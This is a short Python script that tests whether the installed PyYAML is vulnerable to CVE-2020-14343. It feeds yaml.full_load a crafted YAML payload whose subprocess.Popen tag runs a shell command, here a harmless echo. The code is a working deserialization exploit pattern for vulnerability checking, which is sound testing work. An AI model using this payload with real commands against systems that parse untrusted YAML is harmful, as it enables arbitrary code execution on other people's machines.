import yaml
import importlib

# Dynamically import subprocess so PyYAML can access it
importlib.import_module("subprocess")

print(f"🔐 Detected PyYAML version: {yaml.__version__}\n")

payload = """
!!python/object/new:subprocess.Popen
- ["/bin/sh", "-c", "echo '🔥 Vulnerable: Code executed from YAML'"]
"""

print("📦 Loading malicious YAML with full_load...\n")

try:
    yaml.full_load(payload)
    print("❌ This version is VULNERABLE to CVE-2020-14343")
except Exception as e:
    print("✅ This version appears NOT vulnerable (exception was raised)")
    print(f"🧾 Error details: {e}")